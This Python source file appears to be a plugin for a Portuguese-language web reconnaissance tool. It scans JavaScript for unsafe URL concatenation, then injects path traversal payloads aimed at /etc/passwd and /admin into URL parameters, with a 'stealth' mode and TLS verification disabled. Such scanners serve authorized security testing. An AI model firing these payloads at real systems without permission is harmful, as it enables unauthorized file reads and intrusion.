import re
import json
import asyncio
from pathlib import Path
from urllib.parse import urlparse, urljoin, unquote

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error

CONCURRENCY_LIMIT = 20
DELAY_BETWEEN_REQUESTS = 0.5
TIMEOUT = 10

def static_analysis(target: str, jsscanner_dir: Path, output_dir: Path):
    info(f"{C.BOLD}{C.BLUE}🔍 Executando análise estática de CSPT (JS Files)...{C.END}")
    js_files_txt = jsscanner_dir / "js_files.txt"
    
    if not js_files_txt.exists():
        warn("   ⚠️ Arquivo js_files.txt não encontrado. Execute o jsscanner primeiro.")
        return []
        
    js_files = [line.strip() for line in js_files_txt.read_text(errors="ignore").splitlines() if line.strip()]
    if not js_files:
        warn("   ⚠️ Nenhum arquivo JS listado no jsscanner.")
        return []
        
    risky_patterns = [
        r'fetch\s*\(\s*[`"\']\/.*\/.*\+.*[`"\']\s*\)',  # fetch('/api/' + var)
        r'axios\.\w+\s*\(\s*[`"\']\/.*\/.*\+.*[`"\']\s*\)', # axios.get('/api/' + var)
        r'XMLHttpRequest.*\.open\s*\(.*[`"\']\/.*\/.*\+', # xhr.open('GET', '/api/' + var)
        r'\$\s*\.\s*ajax\s*\(.*url\s*:\s*[`"\']\/.*\/.*\+', # $.ajax({url: '/api/' + var})
        r'window\.location\s*=\s*[`"\']\/.*\+', # window.location = '/path/' + var
        r'location\.search|location\.hash|URLSearchParams', # Fontes de entrada
    ]
    
    potential_sources = []
    
    for js_file in js_files:
        try:
            path = Path(js_file)
            if not path.exists():
                # Tenta resolver o caminho relativo caso o js_files.txt tenha salvado relativo
                path = jsscanner_dir / Path(js_file).name
                
            if path.exists():
                content = path.read_text(errors="ignore")
                found_patterns = []
                for pattern in risky_patterns:
                    if re.search(pattern, content):
                        found_patterns.append(pattern)
                
                if found_patterns:
                    potential_sources.append({
                        "file": str(path),
                        "patterns": found_patterns,
                        "snippet": content[:500]
                    })
        except Exception as e:
            pass

    if potential_sources:
        out_file = output_dir / "static_sources.json"
        out_file.write_text(json.dumps(potential_sources, indent=2, ensure_ascii=False))
        success(f"   ✅ {len(potential_sources)} possíveis fontes CSPT encontradas nos arquivos JS.")
    else:
        info("   ℹ️ Nenhuma concatenação de risco óbvia encontrada nos JS.")
        
    return potential_sources

def inject_payload(url: str, payload: str):
    parsed = urlparse(url)
    if not parsed.query:
        return None
        
    query_params = parsed.query.split('&')
    for i, param in enumerate(query_params):
        if '=' in param:
            key, value = param.split('=', 1)
            # Focar em parâmetros comumente vulneráveis a path traversal ou redirects
            if any(k in key.lower() for k in ['file', 'path', 'page', 'url', 'next', 'redirect', 'id', 'doc', 'src', 'load', 'component']):
                query_params[i] = f"{key}={payload}"
                new_query = '&'.join(query_params)
                return parsed._replace(query=new_query).geturl()
    return None

async def test_url_async(client, url, payloads, semaphore):
    results = []
    async with semaphore:
        for payload in payloads:
            test_url = inject_payload(url, payload)
            if not test_url:
                continue
                
            try:
                # Usa modo follow_redirects=False para pegar o primeiro pulo
                resp = await client.get(test_url, timeout=TIMEOUT, follow_redirects=False)
                
                # Heurística: 200 OK + string de sistema (exemplo simplificado) ou acesso administrativo inesperado
                if resp.status_code == 200:
                    text_lower = resp.text.lower()
                    if "root:x:" in text_lower or "daemon:" in text_lower or "[boot loader]" in text_lower or "root:x:0:0" in text_lower:
                        results.append({
                            "url": test_url,
                            "payload": payload,
                            "status": resp.status_code,
                            "evidence": "Arquivo de sistema (/etc/passwd ou boot.ini) lido com sucesso."
                        })
                    elif payload == "../../admin" and "admin" in resp.url.lower():
                         results.append({
                            "url": test_url,
                            "payload": payload,
                            "status": resp.status_code,
                            "evidence": "Endpoint restrito (/admin) supostamente carregado."
                        })
            except Exception:
                pass
            
            await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
    return results

async def dynamic_testing_async(target: str, urls_dir: Path, output_dir: Path, stealth: bool):
    import httpx
    info(f"{C.BOLD}{C.BLUE}🚀 Executando testes dinâmicos CSPT nas URLs...{C.END}")
    
    urls_file = urls_dir / "urls_200.txt"
    if not urls_file.exists():
        urls_file = urls_dir / "urls_all.txt"
        
    if not urls_file.exists():
        warn("   ⚠️ Nenhum arquivo de URLs encontrado. Execute o módulo urls primeiro.")
        return []
        
    raw_urls = urls_file.read_text(errors="ignore").splitlines()
    testable_urls = [u.strip() for u in raw_urls if '?' in u.strip()]
    
    if not testable_urls:
        warn("   ⚠️ Nenhuma URL com parâmetros (query string) encontrada para testar.")
        return []
        
    from core.config import is_in_scope
    scope_root = target # Podemos passar via context, mas aqui assumimos target
    
    in_scope_urls = [u for u in testable_urls if is_in_scope(u, target, scope_root)]
    # Limitar a testes dinâmicos a um escopo para não sobrecarregar
    in_scope_urls = in_scope_urls[:500]
    
    info(f"   📋 {len(in_scope_urls)} URLs com parâmetros prontas para testes de Payload.")
    
    payloads = [
        "../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "../../admin",
        "..%2Fadmin"
    ]
    
    sem_limit = 2 if stealth else CONCURRENCY_LIMIT
    sem = asyncio.Semaphore(sem_limit)
    
    all_findings = []
    
    async with httpx.AsyncClient(verify=False) as client:
        tasks = [test_url_async(client, url, payloads, sem) for url in in_scope_urls]
        
        total = len(tasks)
        completed = 0
        
        for coro in asyncio.as_completed(tasks):
            res = await coro
            if res:
                all_findings.extend(res)
            completed += 1
            if completed % 10 == 0:
                print(f"   [{completed}/{total}] Testes dinâmicos...", end="\r")
        print("") # newline
        
    if all_findings:
        out_file = output_dir / "dynamic_findings.json"
        out_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
        success(f"   🔥 {len(all_findings)} vulnerabilidades dinâmicas de CSPT confirmadas!")
        for f in all_findings:
            success(f"      👉 {f['url']}")
    else:
        info("   ✅ Nenhum payload de CSPT funcionou dinamicamente.")
        
    return all_findings

def run(context: dict):
    target = context.get("target")
    stealth = context.get("stealth", False)
    
    if not target:
        raise ValueError("Target required for CSPT")
        
    info(
        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
        f"   🔀 {C.BOLD}{C.CYAN}CSPT (Client-Side Path Traversal Scanner){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟪───────────────────────────────────────────────────────────🟪\n"
    )

    outdir = ensure_outdir(target, "cspt")
    base = Path("output") / target
    jsscanner_dir = base / "jsscanner"
    urls_dir = base / "urls"
    
    static_sources = static_analysis(target, jsscanner_dir, outdir)
    
    # Run dynamic via asyncio
    try:
        dynamic_findings = asyncio.run(dynamic_testing_async(target, urls_dir, outdir, stealth))
    except Exception as e:
        error(f"Erro durante testes dinâmicos: {e}")
        dynamic_findings = []
        
    summary = {
        "static_sources_count": len(static_sources),
        "dynamic_findings_count": len(dynamic_findings),
        "dynamic_details": dynamic_findings
    }
    
    (outdir / "summary.json").write_text(json.dumps(summary, indent=2, ensure_ascii=False))
    
    success(f"\n{C.GREEN}{C.BOLD}Módulo CSPT finalizado.{C.END}\n")
